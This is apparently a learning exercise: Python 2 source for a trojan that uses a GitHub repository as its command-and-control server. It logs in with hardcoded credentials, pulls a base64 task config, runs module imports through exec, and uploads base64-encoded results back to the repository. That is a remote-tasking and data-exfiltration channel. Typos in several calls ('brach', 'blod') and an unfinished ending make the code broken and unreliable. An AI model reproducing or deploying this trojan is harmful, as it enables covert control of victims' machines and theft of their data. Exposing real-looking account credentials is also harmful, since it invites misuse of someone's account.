import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os



from github3 import  login

trojan_id = "abc"
trojan_config = "%s.json" % trojan_id
data_path = "/data/%s/" % trojan_id

trojan_modules = []
configured = False
task_queus = Queue.Queue()


def connect_to_github():
    gh = login(username="wtlecit1",password="1q2wAZSX")
    repo =gh.repository("wtlecit1","chapter8")
    brach = repo.brach("master")
    return gh,repo,brach
def get_file_contents(filepath):
    gh,repo,branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" %filepath
            blob = repo.blod(filename._json_data['sha'])
            return blob.content
    return None


def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True
    
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
    return config
def store_module_result(data):
    gh,repo,branch = connect_to_github()
    remote_path = "data/%s/%d.data" %(trojan_id,random.randint(1000,10000))
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))        
    return







